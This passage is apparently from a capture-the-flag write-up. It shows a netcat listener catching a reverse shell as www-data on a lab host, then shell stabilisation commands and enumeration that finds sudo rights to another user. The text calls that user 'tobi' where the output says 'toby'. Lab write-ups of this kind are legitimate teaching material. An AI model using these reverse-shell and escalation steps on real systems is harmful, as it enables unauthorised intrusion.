```bash
┌──(haz0x㉿kali)-[/tmp]
└─$ nc -lvnp 9999                                 
listening on [any] 9999 ...
connect to [192.168.133.134] from (UNKNOWN) [10.48.158.241] 50786
Linux ip-10-48-158-241 5.15.0-138-generic #148~20.04.1-Ubuntu SMP Fri Mar 28 14:32:35 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
 10:21:27 up  2:36,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
bash: cannot set terminal process group (896): Inappropriate ioctl for device
bash: no job control in this shell
www-data@ip-10-48-158-241:/$ 

```

# Stabilize shell

```bash
script -qc /bin/bash /dev/null
CTRL+Z
stty raw -echo;fg
export TERM=xterm
```

##### Basic Enumeration

```bash
www-data@ip-10-48-158-241:/$ id   
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@ip-10-48-158-241:/$ whoami
www-data
www-data@ip-10-48-158-241:/$ sudo -l 
Matching Defaults entries for www-data on ip-10-48-158-241:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ip-10-48-158-241:
    (toby) NOPASSWD: ALL
www-data@ip-10-48-158-241:/$ ls /opt /tmp
/opt:
backups

/tmp:
www-data@ip-10-48-158-241:/$ 


```

Great, our foothold user has access to `tobi`. Also looks like someone put a file `backups` in `/opt`. Very interesting files. 